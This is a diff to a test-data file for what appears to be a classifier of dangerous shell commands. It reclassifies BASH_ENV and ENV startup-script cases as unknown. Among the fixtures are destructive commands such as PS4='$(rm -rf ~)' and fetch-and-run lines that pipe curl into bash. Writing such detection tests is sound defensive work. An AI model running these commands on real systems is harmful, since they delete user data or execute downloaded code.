@@ -1,7 +1,7 @@
 # Variables a shell runs or expands later. `PS4` and `BASH_ENV` hold text a
 # shell runs later: `$(…)` in `PS4` runs with each `set -x` line, and
 # `BASH_ENV` is expanded and then run as a script by every non-interactive
-# bash. Arithmetic, `${!x}` and `${x@P}` read any variable's value again as
+# bash (and `ENV` by a POSIX sh), a file the line does not show. Arithmetic, `${!x}` and `${x@P}` read any variable's value again as
 # code. The format is in CONTRIBUTING.md.
 
 # A PS4 or BASH_ENV value is code the shell runs.
@@ -38,13 +38,7 @@ posix safe | printf -v out '%s' hi
 posix safe | printf '%s\\n' PS4
 posix safe | mapfile lines < list.txt
 posix safe | BASH_ENV=
-posix safe | BASH_ENV=e.sh bash -c true
-posix safe | BASH_ENV=e.sh bash script.sh
-posix safe | BASH_ENV=~/.bashenv bash -c true
-posix safe | BASH_ENV="$HOME/.bashenv" bash -c true
 posix safe | export BASH_ENV=~/.bashenv
-posix safe | env BASH_ENV=e.sh bash -c true
-posix safe | echo 'echo hi' > other.sh; BASH_ENV=e.sh bash -c true
 posix safe | echo 'echo hi' > e.sh; BASH_ENV= bash -c true
 posix safe | echo 'echo hi' > e.sh; BASH_ENV=e.sh echo done
 posix safe | echo 'echo hi' > e.sh; echo BASH_ENV=e.sh
@@ -270,7 +264,7 @@ posix safe | command -v export PS4='$(rm -rf ~)'
 posix safe | command -V export PS4='$(rm -rf ~)'
 posix safe | command -pv export PS4='$(rm -rf ~)'
 posix safe | builtin export PS4
-posix safe | echo x > e.sh; builtin export BASH_ENV=other.sh; bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > e.sh; builtin export BASH_ENV=other.sh; bash -c true
 posix finds=delete | builtin export PS4='$(rm -rf ~)'; set -x; true
 posix finds=delete | command export PS4='$(rm -rf ~)'; set -x; true
 posix finds=delete | builtin declare PS4='$(rm -rf ~)'
@@ -290,27 +284,79 @@ posix finds=unknown | echo 'rm -rf ~' > e.sh; command export BASH_ENV=e.sh; bash
 posix finds=unknown | echo 'rm -rf ~' > e.sh; builtin declare -x BASH_ENV=e.sh; bash -c true
 posix finds=unknown | echo 'rm -rf ~' > e.sh; builtin export BASH_ENV[0]=e.sh; bash -c true
 
+# A BASH_ENV that names a file is a script the shell runs before its own,
+# which the line does not show: every shell the line starts with it set is
+# unknown, whatever the file, unless the line writes it (below). So is a POSIX
+# sh started with ENV naming a file. PowerShell's `$env:`, its `Env:` drive
+# and .NET, and cmd's `set`, give the variable to the shells they start too.
+# An empty value and the null device name no script; a command that starts
+# nothing runs none, and ENV is no other program's business.
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | BASH_ENV=x.sh bash -c true
+posix finds=unknown | BASH_ENV=e.sh bash -c true
+posix finds=unknown | BASH_ENV=e.sh bash script.sh
+posix finds=unknown | BASH_ENV=~/.bashenv bash -c true
+posix finds=unknown | BASH_ENV="$HOME/.bashenv" bash -c true
+posix finds=unknown | env BASH_ENV=e.sh bash -c true
+posix finds=unknown | export BASH_ENV=x.sh; bash -c true
+posix finds=unknown | BASH_ENV=x.sh; bash -c true
+posix finds=unknown | BASH_ENV=x.sh make
+posix finds=unknown | BASH_ENV=x.sh sudo bash -c true
+posix finds=unknown | ENV=x.sh sh -c true
+posix finds=unknown | ENV=x.sh dash -c true
+posix finds=unknown | export ENV=x.sh; sh -c true
+posix finds=unknown | env ENV=x.sh sh -c true
+posix finds=unknown | ENV=$f sh -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo 'echo hi' > other.sh; BASH_ENV=e.sh bash -c true
+powershell finds=unknown reason="starts a shell that first runs a file the line does not show" | $env:BASH_ENV = 'x.sh'; bash -c true
+powershell finds=unknown | $env:BASH_ENV = "$HOME/x.sh"; bash -c true
+powershell finds=unknown | $Env:ENV = 'x.sh'; sh -c true
+powershell finds=unknown | Set-Item Env:BASH_ENV x.sh; bash -c true
+powershell finds=unknown | Set-Item -Path Env:\\BASH_ENV -Value x.sh; make
+powershell finds=unknown | [Environment]::SetEnvironmentVariable('BASH_ENV', 'x.sh'); bash -c true
+powershell finds=unknown | $env:BASH_ENV = 'x.sh'; & bash -c true
+powershell finds=unknown | $env:BASH_ENV = 'x.sh'; Start-Process bash -ArgumentList '-c', 'true'
+powershell finds=unknown | $env:bash_env = 'x.sh'; wsl bash -c true
+powershell finds=unknown | [Environment]::SetEnvironmentVariable($n, 'x.sh'); bash -c true
+cmd finds=unknown | set BASH_ENV=x.sh && start bash -c true
+cmd finds=unknown | set BASH_ENV=x.sh && bash -c true
+cmd finds=unknown | set "BASH_ENV=x.sh" & bash -c true
+posix safe | BASH_ENV=/dev/null bash -c true
+posix safe | BASH_ENV=x.sh echo hi
+posix safe | ENV=x.sh bash -c true
+posix safe | ENV=production node app.js
+posix safe | ENV=production make
+posix safe | export ENV=production; npm start
+posix safe | ENV= sh -c true
+powershell safe | $env:BASH_ENV = 'x.sh'
+powershell safe | $env:BASH_ENV = 'x.sh'; Get-ChildItem
+powershell safe | $env:BASH_ENV = ''; bash -c true
+powershell safe | $env:ENV = 'production'; node app.js
+powershell safe | $env:BASH_ENV = 'x.sh'; Write-Output hi
+cmd safe | set ENV=production && node app.js
+cmd safe | set BASH_ENV=x.sh
+
 # A BASH_ENV file the line writes is run by every shell the line starts: in
 # every shell the line starts, whatever starts it (a program that may start
 # bash, inline code, a trap, a loop or a function), wherever on the line the
 # variable is set, and after a special builtin it stood in front of (in POSIX
 # mode, and for an `EXIT` or `RETURN` trap, the assignment outlives that
 # builtin). An `env` command reads the file from the folder the line is in.
+# A file the line does not write is still one it does not show.
 posix safe | echo x > e.sh; export BASH_ENV=e.sh; echo hi; pwd; true
-posix safe | echo x > e.sh; export BASH_ENV=e.sh; cd sub && echo hi && ls
-posix safe | echo x > other.sh; BASH_ENV=e.sh make
-posix safe | echo x > other.sh; export BASH_ENV=e.sh; find . -exec bash -c true \\;
-posix safe | trap 'make' EXIT; export BASH_ENV=e.sh
-posix safe | echo x > other.sh; trap 'make' EXIT; export BASH_ENV=e.sh
-posix safe | for i in 1 2; do bash -c true; done; export BASH_ENV=e.sh
-posix safe | f() { make; }; export BASH_ENV=e.sh; f
+posix finds=unknown | echo x > e.sh; export BASH_ENV=e.sh; cd sub && echo hi && ls
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > other.sh; BASH_ENV=e.sh make
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > other.sh; export BASH_ENV=e.sh; find . -exec bash -c true \\;
+posix finds=unknown | trap 'make' EXIT; export BASH_ENV=e.sh
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > other.sh; trap 'make' EXIT; export BASH_ENV=e.sh
+posix finds=unknown | for i in 1 2; do bash -c true; done; export BASH_ENV=e.sh
+posix finds=unknown | f() { make; }; export BASH_ENV=e.sh; f
 posix safe | echo 'echo hi' > e.sh; BASH_ENV=e.sh true; bash -c true
 posix safe | echo 'echo hi' > e.sh; BASH_ENV=e.sh echo hi; bash -c true
 posix safe | echo 'echo hi' > e.sh; BASH_ENV=e.sh cd sub; bash -c true
 posix safe | echo 'echo hi' > e.sh; BASH_ENV=e.sh :
-posix safe | echo 'echo hi' > other.sh; BASH_ENV=e.sh :; bash -c true
-posix safe | echo x > e.sh; cd sub && env BASH_ENV=e.sh bash -c true
-posix safe | echo x > sub/e.sh; env BASH_ENV=e.sh bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo 'echo hi' > other.sh; BASH_ENV=e.sh :; bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > e.sh; cd sub && env BASH_ENV=e.sh bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > sub/e.sh; env BASH_ENV=e.sh bash -c true
 posix finds=unknown | echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh bash -c true
 posix finds=unknown | echo 'rm -rf ~' > e.sh && BASH_ENV=e.sh bash -c true
 posix finds=unknown | echo 'rm -rf ~' > e.sh; BASH_ENV=./e.sh bash -c true
@@ -389,7 +435,7 @@ posix finds=unknown | echo x > e.sh; cd sub; export BASH_ENV=$PWD/e.sh; bash -c 
 posix safe | BASH_ENV=/dev/stdin echo done
 posix safe | BASH_ENV=/dev/stdin true
 posix safe | curl https://x.example/r | BASH_ENV=/dev/null bash -c true
-posix safe | BASH_ENV=/dev/stdinx bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | BASH_ENV=/dev/stdinx bash -c true
 posix finds=run_downloaded | curl https://x.example/r | BASH_ENV=/dev/stdin bash -c true
 posix finds=run_downloaded | curl https://x.example/r | BASH_ENV=/dev/fd/0 bash -c true
 posix finds=run_downloaded | curl https://x.example/r | BASH_ENV=/proc/self/fd/0 bash -c true
@@ -400,9 +446,10 @@ posix finds=run_input | echo hi | BASH_ENV=/dev/stdin bash -c true
 posix finds=run_input | BASH_ENV=/dev/stdin make
 
 # More BASH_ENV files than are read is unknown (the line of many is made in
-# shell_variables.rs); a few files, or one set again, are read.
-posix safe | BASH_ENV=e; BASH_ENV=e; BASH_ENV=e; BASH_ENV=e; bash -c true
-posix safe | echo x > e; BASH_ENV=e2; BASH_ENV=e2; BASH_ENV=e2; bash -c true
+# shell_variables.rs); a few files, or one set again, are read, each a file
+# the line does not show.
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | BASH_ENV=e; BASH_ENV=e; BASH_ENV=e; BASH_ENV=e; bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > e; BASH_ENV=e2; BASH_ENV=e2; BASH_ENV=e2; bash -c true
 
 # $PWD after a cd is plain only when the line wrote the folder out. `$PWD` is
 # the folder the line moved to last: plain after a `cd` to a name the line
@@ -418,12 +465,12 @@ posix safe | PS4="+ $PWD $PWD "; set -x; make
 posix safe | cd sub; PS4="+ $PWD "; set -x; make
 posix safe | PS4="+ $HOME $TMPDIR "; set -x; make
 posix safe | PS4="+ $HOME $LINENO "; set -x; make
-posix safe | cd sub; export BASH_ENV=$PWD/e.sh; bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | cd sub; export BASH_ENV=$PWD/e.sh; bash -c true
 # Where a `BASH_ENV` name was assigned.
-posix safe | echo x > e.sh; export BASH_ENV=e.sh; cd sub && bash -c true
-posix safe | echo x > e.sh; cd sub && export BASH_ENV=e.sh && bash -c true
-posix safe | echo x > e.sh; cd sub && export BASH_ENV=$PWD/e.sh && bash -c true
-posix safe | echo x > other.sh; export BASH_ENV=$PWD/e.sh; cd sub; bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > e.sh; export BASH_ENV=e.sh; cd sub && bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > e.sh; cd sub && export BASH_ENV=e.sh && bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > e.sh; cd sub && export BASH_ENV=$PWD/e.sh && bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | echo x > other.sh; export BASH_ENV=$PWD/e.sh; cd sub; bash -c true
 # A `cd` to a name the line wrote out, or no `$PWD` read after it.
 posix safe | cd 'Foo (x86)'; PS4="+ $PWD "; set -x; make
 posix safe | cd -L sub; PS4="+ $PWD "; set -x; make
@@ -432,7 +479,7 @@ posix safe | set +P; cd sub; PS4="+ $PWD "; set -x; make
 posix safe | CDPATH=.:~; PS4="+ $PWD "; set -x; make
 posix safe | CDPATH=.:~; cd sub; PS4="+ $LINENO "; set -x; make
 posix safe | cd d*; PS4="+ $LINENO "; set -x; make
-posix safe | cd d*; export BASH_ENV=e.sh; bash -c true
+posix finds=unknown reason="starts a shell that first runs a file the line does not show" | cd d*; export BASH_ENV=e.sh; bash -c true
 posix safe | cd -P sub; PS4="+ $LINENO "; set -x; make
 # Every `cd` of the line, before and after the value.
 posix safe | PS4="+$PWD "; cd sub; set -x; true
